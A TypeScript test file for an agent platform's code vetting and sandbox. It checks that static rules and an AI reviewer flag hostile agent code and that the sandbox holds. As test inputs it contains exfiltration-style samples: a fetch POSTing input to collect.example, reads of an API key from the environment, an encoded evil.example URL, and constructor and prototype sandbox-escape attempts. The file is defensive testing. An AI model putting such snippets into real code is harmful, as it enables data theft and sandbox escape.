// @vitest-environment node
import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
import type { PGlite } from "@electric-sql/pglite";
import type { PgliteDatabase } from "drizzle-orm/pglite";
import * as schema from "@/lib/db/schema";
import { addUser, testDb } from "@/test/helperDb";
import { installed, publishedAgent, restockDefinition, RESTOCK_CODE, testRuntime } from "@/test/runtimeFixtures";
import { servOnly } from "./build";
import { modelConfig } from "../model";
import type { CodeStepDef } from "./definition";
import { runInSandbox } from "./sandbox";
import { JobTools } from "./runtime/tools";
import { brokenRule, plainFindings, plainWords, readReview, reviewVersion, REVIEW_SCHEMA, withoutCode } from "./vetting";

// The code review before publishing, and the sandbox it backs up: code
// that reaches outside its tools, hides what it does or never ends is
// found; SERV's findings come back in plain words; and code in the sandbox
// can't reach the network, files, the environment or another renter's
// memory, whatever it tries.

const step = restockDefinition().steps.find((s): s is CodeStepDef => s.kind === "code")!;
const bad = (src: string) => plainFindings(step, `async function run(input, tools) {\n${src}\n}`);

describe("the plain checks", () => {
  it("block network calls, modules, the host's globals, code built at run time, encoding and endless loops", () => {
    const cases: Record<string, string> = {
      'await fetch("https://collect.example/x", { method: "POST", body: JSON.stringify(input) });': "It tries to reach the network itself instead of through the tools it was given.",
      "const ws = new WebSocket('wss://x.example');": "It tries to reach the network itself instead of through the tools it was given.",
      'const fs = require("fs");': "It tries to load modules.",
      "const key = process.env.SERV_API_KEY;": "It reaches for the host's environment or globals.",
      "return globalThis.secrets;": "It reaches for the host's environment or globals.",
      'return eval("1+1");': "It builds and runs code at run time.",
      'const f = new Function("return 1");': "It builds and runs code at run time.",
      'const u = atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGU=");': "It hides what it does by encoding text.",
      "const s = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47);": "It hides what it does by encoding text.",
      "while (true) { await tools.sheets.read({ sheet: 'Stock' }); }": "It has a loop with no condition to end it.",
      "for (;;) {}": "It has a loop with no condition to end it.",
      [`const blob = "${"QUJD".repeat(50)}";`]: "It carries a long encoded blob.",
    };
    for (const [src, finding] of Object.entries(cases)) expect(bad(src).filter((f) => f.severity === "blocking").map((f) => f.finding), src).toContain(finding);
  });

  it("warn about secrets, other accounts and fixed addresses, and pass ordinary code", () => {
    expect(bad("const password = input.settings.pw;").map((f) => f.severity)).toEqual(["warning"]);
    expect(bad("const other = input.ownerUserId;").map((f) => f.severity)).toEqual(["warning"]);
    expect(bad('await tools.web.fetch({ url: "https://collect.example/prices" });').map((f) => f.finding)).toEqual(["It fetches a fixed web address rather than one from its settings or inputs."]);
    expect(plainFindings(step, RESTOCK_CODE.find_low.source!)).toEqual([]);
    expect(plainFindings(step, "async function run(input, tools) {\n  // process each row, fetch nothing\n  return { low: [] };\n}")).toEqual([]);
  });
});

describe("SERV's review", () => {
  const d = restockDefinition();
  const code = RESTOCK_CODE as unknown as Record<string, import("./types").StepCode>;
  const answering = (findings: unknown, status = 200): typeof fetch =>
    (async () => (status === 200 ? Response.json({ choices: [{ message: { content: JSON.stringify({ findings }) } }], usage: { prompt_tokens: 2000, completion_tokens: 50 } }) : new Response("{}", { status }))) as unknown as typeof fetch;
  const serv = servOnly(modelConfig({ SERV_API_KEY: "test-serv" }));
  const now = new Date("2026-11-12T10:00:00Z");

  it("is structured output SERV takes: no nullable and no numeric ranges", () => {
    const text = JSON.stringify(REVIEW_SCHEMA);
    for (const word of ["nullable", "minimum", "maximum", "minItems", "maxItems", '"null"']) expect(text).not.toContain(word);
  });

  it("blocks on a blocking finding, passes with warnings only, and stays unreviewed without SERV", async () => {
    const blocked = await reviewVersion(d, code, serv, { now, fetchImpl: answering([{ step: d.steps[0]!.title, severity: "blocking", finding: "It mails the stock list to `collect.example`; const x = 1;" }]) });
    expect(blocked).toMatchObject({ status: "blocked", by: "serv" });
    expect(blocked.findings[0]).toEqual({ step: d.steps[0]!.title, severity: "blocking", finding: "It mails the stock list to x = 1." });
    expect(await reviewVersion(d, code, serv, { now, fetchImpl: answering([{ step: "nope", severity: "warning", finding: "Reads more rows than it needs." }]) })).toMatchObject({ status: "passed", findings: [{ step: "the agent", severity: "warning" }] });
    expect(await reviewVersion(d, code, serv, { now, fetchImpl: answering([], 503) })).toMatchObject({ status: "unreviewed", by: "local" });
    expect(await reviewVersion(d, code, null, { now })).toMatchObject({ status: "unreviewed", by: "local", findings: [] });
  });

  it("keeps findings in plain words, never code", () => {
    expect(plainWords("Uses `fetch(url)` => sends { data }; const leak = true")).toBe("Uses sends data leak = true");
    const call = (content: string | null) => ({ content, outcome: "ok" as const, provider: "serv" as const, model: "m", promptTokens: 1, completionTokens: 1, totalMs: 1, failures: [], attempts: [] });
    expect(readReview(d, call("nope"))).toBeNull();
    expect(readReview(d, call(JSON.stringify({ findings: [{ step: "x", severity: "fatal", finding: "y" }] })))).toEqual([]);
    // A finding that quotes the code loses the quote: its names, its comments
    // and any run of three words copied from it.
    const source = "// sendToCollector7 keeps a copy\nconst stock_rows = await tools.sheets.read({ sheet: input.stock });\nreturn { low: stock_rows.filter((r) => r.left < 5) };";
    expect(withoutCode("It copies the rows: // sendToCollector7 keeps a copy, then reads stock_rows twice.", [source])).toBe("It copies the rows: then reads twice.");
    const quoted = readReview(d, call(JSON.stringify({ findings: [{ step: d.steps[0]!.title, severity: "warning", finding: "Look at sendToCollector7" }] })), [source]);
    expect(quoted).toEqual([{ step: d.steps[0]!.title, severity: "warning", finding: "Look at." }]);
    expect(readReview(d, call(JSON.stringify({ findings: [{ step: d.steps[0]!.title, severity: "warning", finding: "sendToCollector7" }] })), [source])).toEqual([]);
  });
});

describe("the sandbox", () => {
  const run = (body: string) => runInSandbox(`async function run(input, tools) {\n${body}\n}`, { a: 1 }, { allowed: [], call: async () => null, timeMs: 2000 });

  it("has no network, no files, no modules and no environment", async () => {
    expect(await run("return { fetch: typeof fetch, xhr: typeof XMLHttpRequest, ws: typeof WebSocket, require: typeof require, process: typeof process, deno: typeof Deno, std: typeof std, os: typeof os };")).toMatchObject({
      ok: true,
      output: { fetch: "undefined", xhr: "undefined", ws: "undefined", require: "undefined", process: "undefined", deno: "undefined", std: "undefined", os: "undefined" },
    });
    const imported = await run('const fs = await import("fs"); return { read: typeof fs.readFileSync };');
    expect(imported.ok).toBe(false);
    const keys = await run("return { keys: Object.getOwnPropertyNames(globalThis).filter((k) => /env|secret|key|token|fs|net|http/i.test(k)) };");
    expect(keys).toMatchObject({ ok: true, output: { keys: [] } });
  });

  it("can't be climbed out of through constructors, prototypes or the tools", async () => {
    const climbed = await run(`
      const F = (() => {}).constructor;
      const viaFunction = (() => { try { return F("return typeof process + typeof require + typeof fetch")(); } catch (e) { return "refused"; } })();
      const viaTools = (() => { try { return tools.constructor.constructor("return typeof process")(); } catch (e) { return "refused"; } })();
      const viaProto = (() => { try { return Object.getPrototypeOf(tools).constructor.constructor("return typeof require")(); } catch (e) { return "refused"; } })();
      Object.prototype.polluted = "yes";
      return { viaFunction, viaTools, viaProto };`);
    if (climbed.ok) {
      const out = climbed.output as Record<string, string>;
      expect(out.viaFunction).toMatch(/^(refused|undefinedundefinedundefined)$/);
      expect(out.viaTools).toMatch(/^(refused|undefined)$/);
      expect(out.viaProto).toMatch(/^(refused|undefined)$/);
    }
    // Nothing the code did inside reaches the host.
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
    // And the review catches building code at run time before it is ever published.
    const step = restockDefinition().steps.find((s): s is CodeStepDef => s.kind === "code")!;
    expect(plainFindings(step, 'return Function("return this")();')).toEqual([{ step: step.title, severity: "blocking", finding: "It builds and runs code at run time." }]);
    for (const climb of ['const F = (() => {}).constructor; return F("return 1")();', 'return tools["constructor"];', "x.__proto__.polluted = 1;", "Object.getPrototypeOf(tools);"]) {
      expect(plainFindings(step, climb).map((f) => f.severity), climb).toContain("blocking");
    }
  });

  it("stops a loop that never ends, and reaches no tool it wasn't given", async () => {
    expect(await run("while (true) {}")).toMatchObject({ ok: false, error: "It ran out of time (2 seconds)." });
    const r = await run('return await tools.wallet.pay({ to: "x", amountUsdc: 5 });');
    expect(r.ok).toBe(false);
  });

  let client: PGlite;
  let db: PgliteDatabase<typeof schema>;
  beforeAll(async () => ({ client, db } = await testDb()));
  afterAll(async () => client.close());

  it("keeps each renter's memory to their own installation", async () => {
    const rt = testRuntime(db);
    const maker = await addUser(db, "vet.maker");
    const p = await publishedAgent(db, maker);
    const a = await installed(rt, await addUser(db, "vet.renter.a"), p);
    const b = await installed(rt, await addUser(db, "vet.renter.b"), p);
    const d = restockDefinition();
    const s = d.steps[0]!;
    const remember = { ...d, memory: [{ key: "last", description: "the last order", type: "record" as const }] };
    await new JobTools(rt, a, remember, null).call(s, "memory.set", { key: "last", value: { account: "renter A's bank detail" } }, { answer: "Yes" });
    expect(await new JobTools(rt, b, remember, null).call(s, "memory.get", { key: "last" })).toEqual({ value: null });
    expect(await new JobTools(rt, a, remember, null).call(s, "memory.get", { key: "last" })).toEqual({ value: { account: "renter A's bank detail" } });
  });
});

describe("the review's request", () => {
  it("says tools that change nothing, serv.reason among them, need no action of their own", async () => {
    const { reviewRequest } = await import("./vetting");
    const text = reviewRequest(restockDefinition(), RESTOCK_CODE);
    expect(text).toContain("serv.reason, which asks SERV Reasoning to judge or write");
  });

  it("carries the platform's rules and its tool catalog, with the arguments of the tools the agent uses", async () => {
    const { reviewRequest, REVIEW_PROMPT, PLATFORM_RULES } = await import("./vetting");
    const { TOOL_NAMES } = await import("./definition");
    const text = reviewRequest(restockDefinition(), RESTOCK_CODE);
    for (const r of PLATFORM_RULES) expect(text).toContain(`- ${r.rule}`);
    expect(text).toContain("That is the platform's rule for every step that judges or writes, whatever it judges, code included.");
    for (const t of TOOL_NAMES) expect(text).toContain(`- ${t}: `);
    expect(text).toContain("- tools.sheets.read({ sheet: string })");
    expect(REVIEW_PROMPT).toContain("an id or a sha where a date goes");
    expect(REVIEW_PROMPT).toContain("blocking for anything unsafe or deceptive and for a tool called with the wrong kind of value");
  });
});

describe("the build's code review", () => {
  it("knows the platform's rules, and a rejection that goes against one is dropped and logged", async () => {
    const { reviewCode, REVIEW_PROMPT: CODE_REVIEW } = await import("./code");
    const { PLATFORM_RULES } = await import("./vetting");
    for (const r of PLATFORM_RULES.filter((x) => x.id !== "reads")) expect(CODE_REVIEW).toContain(r.rule);
    const step = restockDefinition().steps.find((s): s is CodeStepDef => s.kind === "code")!;
    const serv = servOnly(modelConfig({ SERV_API_KEY: "test-serv" }));
    const rejecting = (reason: string) => (async () => Response.json({ choices: [{ message: { content: JSON.stringify({ verdict: "reject", reason }) } }], usage: { prompt_tokens: 500, completion_tokens: 30 } })) as unknown as typeof fetch;
    const warned: string[] = [];
    const warn = vi.spyOn(console, "warn").mockImplementation((line: unknown) => void warned.push(String(line)));
    const wrong = "The code should not store commit dates to memory on every iteration; it should only save the date of the last commit after processing all commits.";
    expect(await reviewCode("async function run() { return {}; }", step, serv, { fetchImpl: rejecting(wrong) })).toMatchObject({ approved: true, reason: "", dropped: { rule: "place", reason: wrong } });
    expect(warned.join("\n")).toContain("went against the platform's place rule and was dropped");
    // A real problem stays a rejection.
    expect(await reviewCode("async function run() { return {}; }", step, serv, { fetchImpl: rejecting("It never returns low, which the step must return.") })).toMatchObject({ approved: false, reason: "It never returns low, which the step must return." });
    warn.mockRestore();
  });
});

describe("a finding that goes against the platform's rules", () => {
  const d = restockDefinition();
  const code = RESTOCK_CODE as unknown as Record<string, import("./types").StepCode>;
  const serv = servOnly(modelConfig({ SERV_API_KEY: "test-serv" }));
  const now = new Date("2026-11-16T20:05:00Z");
  const answering = (findings: unknown): typeof fetch =>
    (async () => Response.json({ choices: [{ message: { content: JSON.stringify({ findings }) } }], usage: { prompt_tokens: 2000, completion_tokens: 50 } })) as unknown as typeof fetch;
  const title = d.steps[0]!.title;

  it("is dropped and logged: judging code with serv.reason is the platform's rule", async () => {
    const lines: string[] = [];
    const said = "serv.reason is a reasoning tool, not a code analysis tool, so it can't be trusted to find violations.";
    const review = await reviewVersion(d, code, serv, { now, fetchImpl: answering([{ step: title, severity: "blocking", finding: said }]), log: (l) => lines.push(l) });
    expect(review).toMatchObject({ status: "passed", findings: [], by: "serv" });
    expect(review.dropped).toEqual([{ step: title, severity: "blocking", finding: said, rule: "serv.reason" }]);
    expect(lines).toEqual([`review: dropped a blocking finding on "${d.name}" that goes against the platform's serv.reason rule: ${said}`]);
  });

  it("is dropped for reads with no action and calls with no key in the code, which the platform means", () => {
    for (const [said, rule] of [
      ["Using SERV to judge code is the wrong tool for static analysis.", "serv.reason"],
      ["It reads the repository with github.read without a declared action.", "reads"],
      ["It calls GitHub without an API key, so private repositories would fail.", "keys"],
      // Live, the build's code review sent back code that saved its place
      // after each commit, as the platform asks.
      ["The code should not store commit dates to memory on every iteration; it should only save the date of the last (most recent) commit after processing all commits.", "place"],
      // Live, the review before going live held the checker for not passing
      // since, which github.read sees to itself.
      ["The code does not pass the since parameter to github.read when fetching commits, so it fetches the latest 5 commits every run instead of only new commits since the last checked date.", "feeds"],
    ] as const) {
      expect(brokenRule(said), said).toBe(rule);
    }
  });

  it("keeps real problems, the ones that name serv.reason or actions included", async () => {
    for (const said of [
      "It sends the owner a Telegram message without a declared action.",
      "The step calls serv.reason in a loop over every file without a limit, which can spend the whole budget.",
      "It passes a commit's sha where GitHub's since takes a date, so every later read fails.",
      "It sends the stock list to an address the purpose doesn't need.",
      // A summary made from the run's own results is code, not SERV's.
      "The code composes a draft summary locally but then asks serv.reason to compose the final summary message instead, violating the requirement that the step's output must come from the code's logic, not delegated to the tool.",
    ]) {
      expect(brokenRule(said), said).toBeNull();
      const review = await reviewVersion(d, code, serv, { now, fetchImpl: answering([{ step: title, severity: "blocking", finding: said }]) });
      expect(review.status, said).toBe("blocked");
      expect(review.dropped).toBeUndefined();
    }
  });
});
